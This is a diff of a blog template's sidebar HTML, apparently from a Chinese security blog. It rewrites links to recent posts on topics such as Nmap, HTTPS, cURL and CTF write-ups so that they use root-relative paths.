-    <li><a href="/categories/被狗吃了的青春/">被狗吃了的青春</a><small>1</small></li>
+    <li><a href="//categories/被狗吃了的青春/">被狗吃了的青春</a><small>1</small></li>
   
   </ul>
 </div>
@@ -438,51 +438,51 @@
   <ul class="entry">
     
       <li>
-        <a href="2014/11/21/2014-11-21/">Fri Nov 21 2014 00:00:00 GMT+0800 (CST)</a>
+        <a href="/2014/11/21/2014-11-21/">2014 - 11 - 21</a>
       </li>
     
       <li>
-        <a href="2014/11/10/png-struct/">PNG图片结构分析和取证</a>
+        <a href="/2014/11/10/png-struct/">PNG图片结构分析和取证</a>
       </li>
     
       <li>
-        <a href="2014/11/09/file-header/">各类文件的文件头</a>
+        <a href="/2014/11/09/file-header/">各类文件的文件头</a>
       </li>
     
       <li>
-        <a href="2014/11/05/curl/">cURL 常用命令</a>
+        <a href="/2014/11/05/curl/">cURL 常用命令</a>
       </li>
     
       <li>
-        <a href="2014/11/02/backbox/">Backbox</a>
+        <a href="/2014/11/02/backbox/">Backbox</a>
       </li>
     
       <li>
-        <a href="2014/11/01/swpu-write-up/">某石油大学CTFwrite-up</a>
+        <a href="/2014/11/01/swpu-write-up/">某石油大学CTFwrite-up</a>
       </li>
     
       <li>
-        <a href="2014/10/31/HTTP/">浅谈HTTPS</a>
+        <a href="/2014/10/31/HTTP/">浅谈HTTPS</a>
       </li>
     
       <li>
-        <a href="2014/10/28/nmap-1/">浅谈Nmap基本原理</a>
+        <a href="/2014/10/28/nmap-1/">浅谈Nmap基本原理</a>
       </li>
     
       <li>
-        <a href="2014/10/24/http-max-connection/">浅谈浏览器最大并发连接数问题</a>
+        <a href="/2014/10/24/http-max-connection/">浅谈浏览器最大并发连接数问题</a>
       </li>
     
       <li>
-        <a href="2014/10/13/same-origin-policy/">浅谈浏览器的同源策略</a>
+        <a href="/2014/10/13/same-origin-policy/">浅谈浏览器的同源策略</a>
       </li>
     
       <li>
-        <a href="2014/10/12/escape-alf-nu-write-ups-1/">escape-Write-ups (Part 1)</a>
+        <a href="/2014/10/12/escape-alf-nu-write-ups-1/">escape-Write-ups (Part 1)</a>
       </li>
     
       <li>
-        <a href="2014/10/12/escape-alf-nu-write-ups-2/">escape-Write-ups (Part 2)</a>
+        <a href="/2014/10/12/escape-alf-nu-write-ups-2/">escape-Write-ups (Part 2)</a>
       </li>
     
   </ul>
